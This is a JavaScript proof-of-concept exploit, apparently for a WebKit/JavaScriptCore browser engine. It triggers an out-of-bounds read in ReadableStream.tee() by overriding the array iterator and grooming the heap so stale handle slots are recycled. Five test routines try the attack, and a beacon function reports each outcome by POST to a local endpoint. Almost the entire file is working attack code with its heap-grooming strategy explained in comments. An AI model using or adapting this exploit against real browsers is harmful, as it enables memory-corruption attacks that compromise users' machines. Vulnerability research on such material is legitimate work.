/*
 * p435 -- tee() OOB via deterministic HandleSlot recycling
 *
 * Key insight: Vector<Strong<JSObject>> destructor only destroys size()
 * elements. With 1-element iterator, size=1, so index 1 is never
 * destructed. The stale data at index 1 is interpreted as HandleSlot.
 *
 * HandleSlot = JSValue* (pointer into HandleSet node array).
 * HandleSet reuses freed slots via LIFO free list.
 *
 * Strategy:
 *   1. Do a 2-element tee (donor). Creates Vector with HandleSlots PA, PB.
 *   2. Donor returns -> frees PA, PB to HandleSet free list (order: PB first).
 *      Vector 128-byte block freed to bmalloc.
 *   3. Do 1-element tee. Vector reuses same 128-byte block.
 *      Allocates 1 Strong<> at index 0: gets PB from free list head.
 *      Index 1 still has stale PB from donor.
 *   4. results[1].get() derefs PB -> reads new JSValue (same as results[0]).
 *   5. Both branches wrap same internal = safe landing.
 *
 * Beacon prefix: V435-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V435-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

function oobTee(sourceData) {
  var rs = new ReadableStream({
    start: function(c) {
      c.enqueue(sourceData || "oob-data");
      c.close();
    }
  });

  var intercepted = false;
  var captured = null;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        captured = {branch1: self[0], branch2: self[1]};
        var items = [self[0]]; // 1 element = OOB at index 1
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    return {branches: branches, captured: captured};
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return {error: e.message};
  }
}

function normalTee() {
  var rs = new ReadableStream({
    start: function(c) { c.enqueue("x"); c.close(); }
  });
  return rs.tee();
}

// ================================================================
// Test A: Single donor -> immediate OOB
// Minimal case: 1 donor tee, then 1-element tee
// ================================================================
function testA() {
  B("A-START");

  // Donor: 2-element tee fills a 128-byte block + 2 HandleSlots
  var donor = normalTee();
  // donor now holds ReadableStream wrappers but the internal Vector
  // was already destroyed (it's a local in tee() C++ code)
  // The 128-byte data block and the 2 HandleSlots are freed

  // OOB: 1-element tee reuses the freed block
  var result = oobTee("A-DATA");

  if (result.error) {
    B("A-OOB-ERR", result.error.slice(0, 80));
    return;
  }

  B("A-OOB-OK", {
    len: result.branches.length,
    type0: result.branches[0] instanceof ReadableStream ? "RS" : typeof result.branches[0],
    type1: result.branches[1] instanceof ReadableStream ? "RS" : typeof result.branches[1]
  });

  // Try operations on branch1 (the OOB one)
  var oobBranch = result.branches[1];

  try {
    B("A-LOCKED", oobBranch.locked);
  } catch(e) {
    B("A-LOCKED-ERR", e.message.slice(0, 60));
  }

  try {
    var reader = oobBranch.getReader();
    B("A-READER-OK!!!");
    reader.read().then(function(r) {
      B("A-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
    }).catch(function(e) {
      B("A-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B("A-READER-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test B: Many donors to warm up free list, then OOB
// More donors = more chance HandleSlot recycling is deterministic
// ================================================================
function testB() {
  B("B-START");

  var donors = [];
  for (var i = 0; i < 50; i++) {
    donors.push(normalTee());
  }
  B("B-DONORS", donors.length);

  // Now OOB tee should reuse a warmed block
  var result = oobTee("B-DATA");

  if (result.error) {
    B("B-OOB-ERR", result.error.slice(0, 80));
    return;
  }

  B("B-OOB-OK", {
    len: result.branches.length,
    type0: result.branches[0] instanceof ReadableStream ? "RS" : typeof result.branches[0],
    type1: result.branches[1] instanceof ReadableStream ? "RS" : typeof result.branches[1]
  });

  var oobBranch = result.branches[1];

  try {
    B("B-LOCKED", oobBranch.locked);
  } catch(e) {
    B("B-LOCKED-ERR", e.message.slice(0, 60));
  }

  try {
    var reader = oobBranch.getReader();
    B("B-READER-OK!!!");
    reader.read().then(function(r) {
      B("B-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
    }).catch(function(e) {
      B("B-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B("B-READER-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test C: Interleave -- donor, drop refs, GC pressure, OOB
// Drop donor refs so GC can free HandleBlocks
// Then alloc new tees to reuse HandleSlot addresses
// ================================================================
function testC() {
  B("C-START");

  // Phase 1: Fill HandleSet with entries
  for (var i = 0; i < 100; i++) normalTee();
  // All returned, HandleSlots freed, blocks freed

  // Phase 2: GC pressure
  for (var i = 0; i < 100; i++) new ArrayBuffer(256);

  // Phase 3: Refill HandleSet with fresh entries
  var keepers = [];
  for (var i = 0; i < 20; i++) {
    keepers.push(normalTee());
  }
  B("C-KEEPERS", keepers.length);
  // These keepers hold Strong<> refs via their ReadableStream wrappers
  // The HandleSlots for the InternalReadableStream's Weak<> refs are alive

  // Phase 4: OOB
  var result = oobTee("C-DATA");

  if (result.error) {
    B("C-OOB-ERR", result.error.slice(0, 80));
    return;
  }

  B("C-OOB-OK", {
    len: result.branches.length,
    type0: result.branches[0] instanceof ReadableStream ? "RS" : typeof result.branches[0],
    type1: result.branches[1] instanceof ReadableStream ? "RS" : typeof result.branches[1]
  });

  var oobBranch = result.branches[1];
  try {
    B("C-LOCKED", oobBranch.locked);
  } catch(e) {
    B("C-LOCKED-ERR", e.message.slice(0, 60));
  }

  try {
    var reader = oobBranch.getReader();
    B("C-READER-OK!!!");
    reader.read().then(function(r) {
      B("C-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
    }).catch(function(e) {
      B("C-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B("C-READER-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// Test D: Rapid cycle -- donor + OOB in tight loop
// Try 20 times, report first success
// ================================================================
function testD() {
  B("D-START");

  var success = false;
  for (var attempt = 0; attempt < 20; attempt++) {
    // Donor
    normalTee();

    // Immediate OOB
    var result = oobTee("D-" + attempt);

    if (result.error) {
      if (attempt < 3) B("D-ATTEMPT-" + attempt + "-ERR", result.error.slice(0, 40));
      continue;
    }

    var oobBranch = result.branches[1];
    try {
      var locked = oobBranch.locked;
      if (!success) {
        success = true;
        B("D-FIRST-SUCCESS!!!", {attempt: attempt, locked: locked});

        try {
          var reader = oobBranch.getReader();
          B("D-READER-OK!!!");
          reader.read().then(function(r) {
            B("D-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
          }).catch(function(e) {
            B("D-READ-ERR", e.message.slice(0, 60));
          });
        } catch(e) {
          B("D-READER-ERR", e.message.slice(0, 60));
        }
        break;
      }
    } catch(e) {
      if (attempt < 3) B("D-ATTEMPT-" + attempt + "-LOCKED-ERR", e.message.slice(0, 40));
    }
  }

  if (!success) B("D-NO-SUCCESS", {attempts: 20});
  B("D-DONE");
}

// ================================================================
// Test E: Type check -- what object type did we get from OOB?
// ================================================================
function testE() {
  B("E-START");

  // 10 donors
  for (var i = 0; i < 10; i++) normalTee();

  var result = oobTee("E-DATA");
  if (result.error) {
    B("E-OOB-ERR", result.error.slice(0, 80));
    return;
  }

  var b0 = result.branches[0];
  var b1 = result.branches[1];

  // Check if they're the same stream (shared internal)
  try {
    B("E-SAME-LOCKED", {
      b0: b0.locked,
      b1: b1.locked
    });

    // Lock b0, check if b1 also shows locked
    var r0 = b0.getReader();
    B("E-B0-READER-OK");

    B("E-AFTER-LOCK", {
      b0: b0.locked,
      b1: b1.locked
    });

    // If b1 is now locked, they share the same internal
    // If b1 is not locked, they have different internals
    // (b1 points to a different object from the OOB read)
  } catch(e) {
    B("E-ERR", e.message.slice(0, 60));
  }
}

testA();
setTimeout(function() { testB(); }, 2000);
setTimeout(function() { testC(); }, 4000);
setTimeout(function() { testD(); }, 6000);
setTimeout(function() { testE(); }, 8000);
setTimeout(function() { B("DONE"); }, 12000);
})();
